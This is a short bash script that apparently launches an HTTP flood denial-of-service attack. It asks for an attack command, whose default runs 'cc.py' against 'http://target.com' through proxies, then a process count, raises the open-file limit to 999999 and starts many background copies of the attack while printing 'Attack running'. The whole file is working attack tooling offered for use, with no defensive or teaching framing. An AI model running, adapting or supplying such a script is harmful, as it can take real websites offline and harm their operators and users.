#!/bin/bash
#
#  Please prepare proxies list first,
#  Then set the parameters for this file
#  And run the multiproc script.
#

#Set the command you want to exec
echo "Default atk_cmd: python3 cc.py -url http://target.com -v 4 -s 60"
read -p "> Set atk_cmd: " atk_cmd
if [ -z $atk_cmd ]; then
	atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
fi

#Set the amount of processes wanted
echo "Default processes: 10"
read -p "> Set processes: " processes
if [[ -z "$processes" || ! "$processes" =~ ^[0-9]+$ ]]; then
	processes=10
fi

#Set the system limit
echo "Default ulimit: 999999"
read -p "> Set ulimit: " ulimit
if [[ -z "$ulimit" || ! "$ulimit" =~ ^[0-9]+$ ]]; then
	ulimit -n 999999
else
	ulimit -n $ulimit
fi

echo "✅ Attack running..."
echo "	| atk_cmd: $atk_cmd"
echo "	| processes: $processes"
echo "	| ulimit: $ulimit"

for ((i=0; i < ($processes); i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
